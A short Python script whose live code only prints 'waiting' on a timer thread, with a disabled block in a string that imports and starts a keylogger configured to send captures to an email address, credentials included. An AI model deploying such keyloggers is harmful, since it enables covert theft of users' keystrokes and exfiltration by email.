
import time, _thread
'''import keylogger

my_keylogger = keylogger.Keylogger(300, "nicenoob247@gmail.com", "nicenoob1234")
my_keylogger.start()
'''


def s(t, d):
    while 1:
        time.sleep(d)
        print(t)


_thread.start_new_thread(s, ("waiting", 250))
time.sleep(300)
print("done")